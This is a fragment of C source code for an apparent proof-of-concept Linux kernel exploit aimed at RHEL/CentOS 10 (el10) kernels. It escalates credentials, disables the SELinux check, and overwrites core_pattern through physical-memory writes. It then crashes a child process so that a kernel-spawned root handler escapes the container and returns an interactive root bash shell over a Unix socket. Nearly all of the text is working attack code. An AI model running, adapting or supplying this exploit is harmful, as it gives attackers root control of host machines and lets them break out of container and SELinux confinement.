    escalate_cred(task_pa, init_userns);
    verify_escape();
    return resolve_syms(avc, core_pattern);
}

/* arm the core_pattern escape. No namespace surgery: the root shell arrives as the kernel-spawned
   core_pattern handler, so we never run this (container) task in a half-rewritten namespace state.
   Three tiers: in-process parser (no privilege), then the /proc/kallsyms cred path, then give up.
   Returns 0 once core_pattern is armed, -1 to let main clean up and exit without crashing. */
static int run_escape(void)
{
    unsigned long avc = 0;
    unsigned long core_pattern = 0;
    if (g_force_proc) {
        printf("[*] --force-proc-kallsyms: skipping in-process parser\n");
        fflush(stdout);
    }
    /* tier 1 (in-process) unless forced off; on failure fall back to tier 2 (/proc/kallsyms). The
       CAP_SYSLOG + init_user_ns cred rewrite happens ONLY inside resolve_syms_proc, i.e. only when
       the /proc/kallsyms path is actually used, never on the in-process path. */
    if (g_force_proc || resolve_syms_inproc(&avc, &core_pattern) != 0) {
        if (!g_force_proc) {
            printf("[*] falling back to the CAP_SYSLOG /proc/kallsyms path\n");
            fflush(stdout);
        }
        if (resolve_syms_proc(&avc, &core_pattern) != 0) {
            return -1;
        }
    }
    stub_mac(avc);
    return patch_core_pattern(core_pattern);
}

/* restore the page table to a teardown-safe state, using the self-map directly (no scan). */
static void cleanup_pagetable(unsigned long leaf_pt_phys)
{
    /* (1) leaf PT is double-freed on exit (pipe put_page + pte_free). Bump its struct page
       _refcount by 1 so it is freed exactly once. struct page = vmemmap_base + pfn*sizeof(page). */
    unsigned long sp_va = pm_vmemmap_base() + (leaf_pt_phys >> 12) * (unsigned long)pm_szpage();
    unsigned long sp_pa = pm_kva2pa(sp_va);
    long off_refcount = pm_off("page", "_refcount");
    if (sp_pa && off_refcount >= 0) {
        unsigned int rc = 0;
        phys_read(sp_pa + (unsigned long)off_refcount, &rc, 4);
        unsigned int nrc = rc + 1;
        phys_write(sp_pa + (unsigned long)off_refcount, &nrc, 4);
        printf("[*] cleanup: leaf PT page @phys 0x%lx _refcount %u -> %u\n", sp_pa, rc, nrc);
    } else {
        printf("[!] cleanup: could not locate leaf PT struct page (_refcount off=%ld)\n", off_refcount);
    }
    /* (2) restore leaf PT's PTEs: real ent[0..30] for the pages VR faulted, zero the rest, so mm
       teardown put_page's OUR pages (not forged kernel PFNs). Self-map slot zeroed LAST. */
    for (int i = 0; i < 31; i++) {
        if (i != g_selfslot) {
            g_leaf_pte[i] = g_ent[i];
        }
    }
    for (int i = 31; i < 512; i++) {
        if (i != g_selfslot) {
            g_leaf_pte[i] = 0;
        }
    }
    __asm__ __volatile__("mfence" ::: "memory");
    g_leaf_pte[g_selfslot] = 0;
    printf("[*] cleanup: leaf PT PTEs restored (real 0..30, rest zeroed); self-map down\n");
    fflush(stdout);
}

/* core_pattern handler (--core <PID>), run by the kernel as ROOT in the init namespaces on a core
   dump. The host mount namespace cannot see the container's /tmp directly, but it can through the
   crashing task's root link: /proc/<PID>/root<sock> is the same socket the caller bound inside the
   container. Connect there, wire it onto stdio, and exec an interactive shell. This is a fresh
   kernel-spawned process already in the init namespaces, so there is no live-task namespace state to
   keep consistent: the whole pid-namespace hazard from the in-place approach simply does not exist. */
static int core_handler(const char *pid, const char *sock)
{
    char path[256];
    snprintf(path, sizeof path, "/proc/%s/root%s", pid, sock);
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s < 0) {
        return 1;
    }
    struct sockaddr_un sa;
    memset(&sa, 0, sizeof sa);
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, path, sizeof sa.sun_path - 1);
    if (connect(s, (struct sockaddr *)&sa, sizeof sa) < 0) {
        return 1;
    }
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    if (s > 2) {
        close(s);
    }
    char *const env[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                          "HOME=/root", "TERM=xterm", NULL };
    execle("/bin/bash", "bash", "-i", (char *)NULL, env);
    execle("/bin/sh", "sh", "-i", (char *)NULL, env);
    return 127;
}

/* relay the caller's terminal to the root-shell socket until either side closes. */
static void relay(int sock)
{
    struct pollfd pfd[2];
    pfd[0].fd = 0;
    pfd[0].events = POLLIN;
    pfd[1].fd = sock;
    pfd[1].events = POLLIN;
    char buf[4096];
    for (;;) {
        if (poll(pfd, 2, -1) < 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }
        if (pfd[1].revents & (POLLIN | POLLHUP | POLLERR)) {
            ssize_t n = read(sock, buf, sizeof buf);
            if (n <= 0) {
                break;
            }
            (void)!write(1, buf, n);
        }
        if (pfd[0].fd >= 0 && (pfd[0].revents & (POLLIN | POLLHUP))) {
            ssize_t n = read(0, buf, sizeof buf);
            if (n <= 0) {
                shutdown(sock, SHUT_WR);
                pfd[0].fd = -1;
                continue;
            }
            (void)!write(sock, buf, n);
        }
    }
}

/* bind the container-side socket, crash a child to fire the core_pattern handler, and relay the
   root shell it connects back with. */
static void trigger_core_shell(void)
{
    unlink(g_core_sock);
    int srv = socket(AF_UNIX, SOCK_STREAM, 0);
    if (srv < 0) {
        printf("[!] core socket failed\n");
        return;
    }
    struct sockaddr_un sa;
    memset(&sa, 0, sizeof sa);
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, g_core_sock, sizeof sa.sun_path - 1);
    if (bind(srv, (struct sockaddr *)&sa, sizeof sa) < 0) {
        printf("[!] bind %s failed\n", g_core_sock);
        return;
    }
    listen(srv, 1);
    pid_t pc = fork();
    if (pc == 0) {
        struct rlimit rl;
        rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
        setrlimit(RLIMIT_CORE, &rl);
        *(volatile int *)0 = 0;     /* SIGSEGV -> kernel runs core_pattern as root in the init ns */
        _exit(0);
    }
    printf("[*] crashed a child; waiting for root shell via core_pattern...\n");
    fflush(stdout);
    int c = accept(srv, NULL, NULL);
    if (c < 0) {
        printf("[!] accept failed (handler did not connect)\n");
        return;
    }
    printf("[+] root shell connected; relaying (type commands, Ctrl-D to exit)\n");
    fflush(stdout);
    relay(c);
    close(c);
    waitpid(pc, NULL, 0);
}

/* this PoC is specific to the RHEL/CentOS family Enterprise Linux 10 (el10) kernel: the page-table
   walk, the kallsyms table layout and the BTF assumptions are tied to it. The source of truth is the
   KERNEL release (uname), e.g. 6.12.0-228.el10.x86_64 (RHEL) / 6.12.0-242.el10.x86_64 (CentOS): it
   is identical in a container and on the host, unlike /etc/os-release which reflects the container
   userspace (a CentOS rootfs over a non-el10 host, or any non-CentOS container, would mislead it).
   Returns 1 only on an el10 kernel. */
static int require_el10(void)
{
    struct utsname u;
    if (uname(&u) != 0) {
        return 0;
    }
    return strstr(u.release, ".el10") != 0;
}

/* print this task's SELinux context: the domain we are escaping FROM (e.g. httpd_t), proving the
   in-process resolve runs without /proc/kallsyms in a confined domain. */
static void show_context(void)
{
    char ctx[160];
    int fd = open("/proc/self/attr/current", O_RDONLY);
    if (fd < 0) {
        return;
    }
    ssize_t n = read(fd, ctx, sizeof ctx - 1);
    close(fd);
    if (n > 0) {
        ctx[n] = 0;
        printf("[*] caller context: %s\n", ctx);
        fflush(stdout);
    }
}

int main(int argc, char **argv)
{
    if (argc >= 4 && !strcmp(argv[1], "--core")) {
        return core_handler(argv[2], argv[3]);
    }
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--force-proc-kallsyms")) {
            g_force_proc = 1;
        }
    }
    if (!require_el10()) {
        fprintf(stderr, "[-] not a RHEL/CentOS 10 (el10) kernel (uname release lacks .el10); "
                        "this PoC targets el10 only; aborting.\n");
        return 2;
    }
    if (!has_5level()) {
        fprintf(stderr, "[-] 4-level paging (LA57 inactive); this build needs active 5-level "
                        "paging; aborting before any kernel write.\n");
        return 2;
    }
    snprintf(g_core_sock, sizeof g_core_sock, CORE_SOCK_FMT, getpid());
    show_context();
    loopback_up();
    if (trigger_and_reclaim() != 0) {
        fprintf(stderr, "[-] trigger/reclaim failed\n");
        return 1;
    }
    unsigned long leaf_pt_phys = bootstrap_selfref();
    if (!leaf_pt_phys) {
        freeze_safe("bootstrap failed (dirty page table is live)");
    }
    int armed = run_escape();
    cleanup_pagetable(leaf_pt_phys);
    if (armed != 0) {
        fprintf(stderr, "[-] escape not armed; page table cleaned, exiting without crashing\n");
        return 1;
    }
    /* core_pattern is armed; the root shell arrives as the kernel-spawned helper, so its own id is
       the proof of escape (this task's uid is intentionally left untouched on the in-process path). */
    trigger_core_shell();
    return 0;
}
